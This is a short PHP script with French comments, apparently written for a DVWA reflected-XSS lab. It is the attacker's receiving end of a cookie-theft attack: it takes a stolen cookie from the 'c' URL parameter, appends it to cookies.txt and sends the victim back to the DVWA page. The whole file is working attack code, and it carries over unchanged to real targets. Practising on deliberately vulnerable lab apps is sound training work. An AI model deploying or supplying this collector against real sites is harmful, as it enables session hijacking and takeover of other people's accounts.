<?php
$cookie = $_GET['c']; // Récupère le cookie envoyé via le paramètre 'c' de l'URL
$file = 'cookies.txt'; // Nom du fichier où stocker les cookies
file_put_contents($file, $cookie . "\n", FILE_APPEND); // Ajoute le cookie au fichier, sur une nouvelle ligne
header('Location: http://localhost/dvwa/vulnerabilities/xss_r/'); // Redirige la victime vers la page DVWA XSS Reflected
exit(); // Termine l'exécution du script
?>